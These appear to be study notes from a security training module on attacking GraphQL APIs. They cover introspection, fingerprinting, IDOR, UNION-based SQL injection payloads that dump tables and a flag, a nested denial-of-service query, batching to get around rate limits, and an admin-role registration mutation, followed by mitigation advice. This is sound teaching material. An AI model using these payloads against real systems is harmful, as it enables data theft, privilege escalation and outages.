[GraphQL](https://graphql.org/) is a query language typically used by web APIs as an alternative to REST. It enables the client to fetch required data through a simple syntax while providing a wide variety of features typically provided by query languages, such as SQL. Like REST APIs, GraphQL APIs can read, update, create, or delete data. However, GraphQL APIs are typically implemented on a single endpoint that handles all queries. As such, one of the main benefits of using GraphQL over traditional REST APIs is efficiency in using resources and requests.

## basics
- the endpoint is located at `/graphql`, `/api/graphql`
- GraphQL queries select `fields` of objects. Each object is of a specific `type` defined by the backend. The query is structured according to GraphQL syntax, with the name of the `query` to run at the root. For instance, we can query the `id`, `username`, and `role` fields of all `User` objects by running the `users` query:
---
## Graphql queries
### query format
```graphql

{
  <query-name> <OPTIONAL(arguements)> {
    field1
    field2
    
  }
}


{
  users {
    id
    username
    role
  }
}
  users ("username: vipa0z") {
    id
    username
    role
  }
}

{
  secrets {
    id
    secret
    
  }
}


```

## Query arguements
If a query supports arguments, we can add a supported argument to filter the query results. For instance, if the query `users` supports the `username` argument, we can query a specific user by supplying their username:

```graphql
{
  users(username: "admin") {
    id
    username
    role
  }
}
```

## subquerying
GraphQL queries support sub-querying, which enables a query to obtain details from an object referencing another object. For instance, assume that a `posts` query returns a field `author` that holds a user object. We can then query the username and role of the `author` in our query like so:

```graphql
{
  posts {
    title
    author {
      username
      role
    }
  }
}
```

## Identifying the GraphQL Engine
[graphw00f](https://github.com/dolevf/graphw00f). Graphw00f will send various GraphQL queries, including malformed queries, and can determine the GraphQL engine by observing the backend's behavior and error messages in response to these queries.


```shell-session
python3 main.py -d -f -t http://target


[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
```
## engine attack surface matrix
pointed by graphwoof

the web application runs a [graphiql](https://github.com/graphql/graphiql) interface.
enables us to provide GraphQL queries directly, which is a lot more convenient than running the queries through Burp

## Introspection
[Introspection](https://graphql.org/learn/introspection/) is a GraphQL feature that enables users to query the GraphQL API about the structure of the backend system.

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

## IDENTIFYING TYPES
```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

![[info_3.png]]


## obtain the name of all of the type's fields with the following introspection query:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
![GraphiQL interface showing a query for type "UserObject" with fields: "username" and "password," both of type "String" and kind "SCALAR."](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/info_4.png)

obtain all the queries supported by the backend using this query:


```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```


"general" introspection query that dumps all information about types, fields, and queries supported by the backend:
```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

The result of this query is quite large and complex. However, we can visualize the schema using the tool [GraphQL-Voyager](https://github.com/graphql-kit/graphql-voyager). For this module, we will use the [GraphQL Demo](https://graphql-kit.com/graphql-voyager/). However, in a real engagement, we should follow the GitHub instructions to host the tool ourselves so that we can ensure that no sensitive information leaves our system.

In the demo, we can click `CHANGE SCHEMA` and select `INTROSPECTION`. After pasting the result of the above introspection query in the text field and clicking on `DISPLAY`, the backend's GraphQL schema is visualized for us. We can explore all supported queries, types, and fields:


## IDOR

querying other users

To demonstrate the impact of this IDOR vulnerability, we need to determine what data we can access without authorization. To do so, we are going to use the following introspection queries to determine all fields of `User` type:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

query for another user's password value:
```graphql
{
  user(username: "test") {
    username
    password
  }
}
```

## Injection Attacks

Since GraphQL is a query language, the most common use case is fetching data from some kind of storage, typically a database. As SQL databases are one of the most predominant forms of databases, SQL injection vulnerabilities can inherently occur in GraphQL APIs that do not properly sanitize user input from arguments in the SQL queries executed by the backend. 

we should carefully investigate all GraphQL queries, check whether they 
support arguments, and analyze these arguments for potential SQL injections.

To identify if a query requires an argument, we can send the query without any arguments and analyze the response. If the backend expects an argument, the response contains an error that tells us the name of the required argument.

## SQL Injection

To construct a UNION-based SQL injection payload, let us take another look at the results of the introspection query:

![GraphQL schema diagram with three tables: Query, UserObject](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/info_5.png)

The vulnerable `user` query returns a `UserObject`, so let us focus on that object. As we can see, the object consists of six fields and a link (`posts`). The fields correspond to columns in the database table. As such, our UNION-based SQL injection payload needs to contain six columns to match the number of columns in the original query. Furthermore, the fields we specify in our GraphQL query correspond to the columns returned in the response. For instance, since the `username` is a `UserObject's` third field, querying for the `username` will result in the third column of our UNION-based payload being reflected in the response.

As the GraphQL query only returns the first row, we will use the [GROUP_CONCAT](https://mariadb.com/kb/en/group_concat/) function to exfiltrate multiple rows at a time. This enables us to exfiltrate all table names in the current database with the following payload:

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

The response contains all table names concatenated in the `username` field:

```graphql
{
  "data": {
    "user": {
      "username": "user,secret,post"
    }
  }
}
```
## example exfiltrating a flag column
1. must match the number of columns (use introspect query from voyager)
2. with union based sqli, use group_concat
since graphql query is only returning the first row, we must use group_concat
use group_concat with UNION BASED SQLI, set the value ur trying to exfiltrate inside
```
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(flag),4,5,6 FROM flag-- -") {
    username
  }
}

```
## XSS
XSS vulnerabilities can occur if GraphQL responses are inserted into the HTML page without proper sanitization. Similar to the above SQL injection vulnerability, we should investigate any GraphQL arguments for potential XSS injection points. However, in this case, both queries do not return an XSS payload:
![[Pasted image 20251130000224.png]]
XSS vulnerabilities can also occur if invalid arguments are reflected in error messages.

![[Pasted image 20251130000241.png]]
## Denial-of-Service (DoS) & Batching Attacks
Depending on the GraphQL API's configuration, we can create queries that result in exponentially large responses and require significant resources to process. This can lead to high hardware utilization on the backend system, potentially leading to a DoS scenario that limits the service's availability to other users.

To execute a DoS attack, we must identify a way to construct a query that results in a large response. Let's look at the visualization of the introspection results in `GraphQL Voyager`. We can identify a loop between the `UserObject` and `PostObject` via the `author` and `posts` fields:
![[Pasted image 20251130001957.png]]

We can abuse this loop by constructing a query that queries the author of all posts. For each author, we then query the author of all posts again. If we repeat this many times, the result grows exponentially larger, potentially resulting in a DoS scenario.

Since the `posts` object is a `connection`, we need to specify the `edges` and `node` fields to obtain a reference to the corresponding `Post` object. As an example, let us query the author of all posts. From there, we will query all posts by each author and then the author's username for each of these posts:
```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```
Making our initial query large will slow down the server significantly, potentially causing availability issues for other users. For instance, the following query crashes the `GraphiQL` instance:
```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              posts {
                edges {
                  node {
                    author {
                      posts {
                        edges {
                          node {
                            author {
                              posts {
                                edges {
                                  node {
                                    author {
                                      posts {
                                        edges {
                                          node {
                                            author {
                                              posts {
                                                edges {
                                                  node {
                                                    author {
                                                      posts {
                                                        edges {
                                                          node {
                                                            author {
                                                              posts {
                                                                edges {
                                                                  node {
                                                                    author {
                                                                      username
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

```
## Batching Attacks
Batching in GraphQL refers to executing multiple queries with a single request. We can do so by directly supplying multiple queries in a JSON list in the HTTP request. For instance, we can query the ID of the user `admin` and the title of the first post in a single request:


```http
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Length: 86
Content-Type: application/json

[
	{
		"query":"{user(username: \"admin\") {uuid}}"
	},
	{
		"query":"{post(id: 1) {title}}"
	}
]
```

The response contains the requested information in the same structure we provided the query in:

![GraphQL request and response. Request: two queries, one for user with username "admin" to get uuid, another for post with id 1 to get title. Response: user uuid "3", post title "Lorem ipsum 1".](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/batching_1.png)

Batching is not a security vulnerability but an intended feature that can be enabled or disabled. However, batching can lead to security issues if GraphQL queries are used for sensitive processes such as user login. Since batching enables an attacker to provide multiple GraphQL queries in a single request, it can potentially be used to conduct brute-force attacks with significantly fewer HTTP requests. This could lead to bypasses of security measures in place to prevent brute-force attacks, such as rate limits.

assume a web application uses GraphQL queries for user login. The GraphQL endpoint is protected by a rate limit, allowing only five requests per second. An attacker can brute-force user accounts with only five passwords per second. However, using GraphQL batching, an attacker can put multiple login queries into a single HTTP request. Assuming the attacker constructs an HTTP request containing 1000 different GraphQL login queries, the attacker can now brute-force user accounts with up to 5000 passwords per second, rendering the rate limit ineffective. Thus, GraphQL batching can enable powerful brute-force attacks.

---
## mutations
Mutations are GraphQL queries that modify server data. They can be used to create new objects, update existing objects, or delete existing objects.


identify all mutations and their arguements
```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

From the result, we can identify a mutation `registerUser`, presumably allowing us to create new users. The mutation requires a `RegisterUserInput` object as an input:

![GraphiQL interface showing a query and response. Query: retrieves schema mutation type fields and arguments. Response: mutation type "Mutation" with field "registerUser", argument "input" of type "RegisterUserInput".](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/mutation_1.png)

We can now query all fields of the `RegisterUserInput` object with the following introspection query to obtain all fields that we can use in the mutation:

```json
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

From the result, we can identify that we can provide the new user's `username`, `password`, `role`, and `msg`:
![GraphiQL interface showing a query and response. Query: retrieves type "RegisterUserInput" with input fields. Response: fields include "username", "password", "role", and "msg", all with null descriptions and default values.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/mutation_2.png)

As we identified earlier, we need to provide the password as an MD5-hash. To hash our password, we can use the following command:


```shell-session
vipa0z@htb[/htb]$ echo -n 'password' | md5sum

5f4dcc3b5aa765d61d8327deb882cf99  -
```

With the hashed password, we can now finally register a new user by running the mutation:
```graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

---
## Exploitation with Mutations


#### 1. mutation where we can set the role
. In this case, we can provide the `role` argument for newly registered users, which might enable us to create users with a different role than the default role, potentially allowing us to escalate privileges.
```graphql
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```
   In the result, we can see that the role `admin` is reflected, which indicates that the attack was successful:
![GraphiQL interface showing a mutation and response. Mutation: registerUser with input username "vautiaAdmin" and password. Response: user data includes username "vautiaAdmin", password, message "Hacked!", and role "admin".](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/mutation_4.png)

---
## Tools

## GraphQL-Cop

We can use the tool [GraphQL-Cop](https://github.com/dolevf/graphql-cop), a security audit tool for GraphQL APIs. After cloning the GitHub repository and installing the required dependencies, we can run the `graphql-cop.py` Python script:

```shell-session
 python3 graphql-cop.py  -v

```

We can then specify the GraphQL API's URL with the `-t` flag. GraphQL-Cop then executes multiple basic security configuration checks and lists all identified issues, which is a great baseline for further manual tests:

```shell-session
python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql
```

## InQL

[InQL](https://github.com/doyensec/inql) is a Burp extension we can install via the `BApp Store` in Burp. After a successful installation, an `InQL` tab is added in Burp.

Furthermore, the extension adds `GraphQL` tabs in the Proxy History and Burp Repeater that enable simple modification of the GraphQL query without having to deal with the encompassing JSON syntax:

![GraphQL request and response. Request: query for users' uuid and username. Response: HTTP 200 OK, returns user with uuid "1" and username "htb-stdnt".](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/inql_1.png)

Furthermore, we can right-click on a GraphQL request and select `Extensions > InQL - GraphQL Scanner > Generate queries with InQL Scanner`:

![GraphQL request and response with menu options. Request: POST to /graphql. Menu: Extensions > InQL - GraphQL Scanner with options to generate queries, batch attack, or open in GraphiQL. Response: HTTP 200 OK, returns user with uuid "1" and username "htb-stdnt".](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/inql_2.png)

Afterward, InQL generates introspection information. The information regarding all mutations and queries is provided in the `InQL` tab for the scanned host:

![InQL interface showing a file tree and GraphQL query. File tree includes mutations and queries like posts.graphql. Query retrieves posts with author details, authorId, body, category, id, title, and uuid.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/inql_3.png)

This is only a basic overview of InQL's functionality. Check out the official [GitHub repository](https://github.com/portswigger/inql) for more details.

---
## Mitigating Graph-QL vulnerabilities
### Information Disclosure

General security best practices apply to prevent information disclosure vulnerabilities. These include preventing verbose error messages and instead displaying generic error messages. Furthermore, introspection queries are potent tools for obtaining information. As such, they should be disabled if possible. At the very least, whether any sensitive information is disclosed in introspection queries should be checked. If this is the case, all sensitive information needs to be removed.

### Injection Attacks

Proper input validation checks need to be implemented to prevent any injection-type attacks such as SQL injection, command injection, or XSS. Any data the user supplies should be treated as untrusted before appropriate sanitization. The use of allowlists should be preferred over denylists.


## DOS
As discussed, DoS attacks and the amplification of brute-force attacks through batching are common GraphQL attack vectors. Proper limits need to be implemented to mitigate these types of attacks. This can include limits to the GraphQL query depth, limits to the maximum GraphQL query size, and rate limits on the GraphQL endpoint to prevent many subsequent queries in quick succession. Additionally, batching should be turned off in GraphQL queries if possible. If batching is required, the query depth needs to be limited.

### API Design

General API security best practices should be followed to prevent further attacks, such as attacks against improper access control (for instance, IDOR) or attacks resulting from improper authorization checks on mutations. This includes strict access control measures according to the principle of least privileges. In particular, the GraphQL endpoint should only be accessible after successful authentication, if possible, according to the API's use case. Furthermore, authorization checks must be implemented; preventing actors from executing queries or mutations they are not authorized to.

For more details on securing GraphQL APIs, check out OWASP's [GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html).
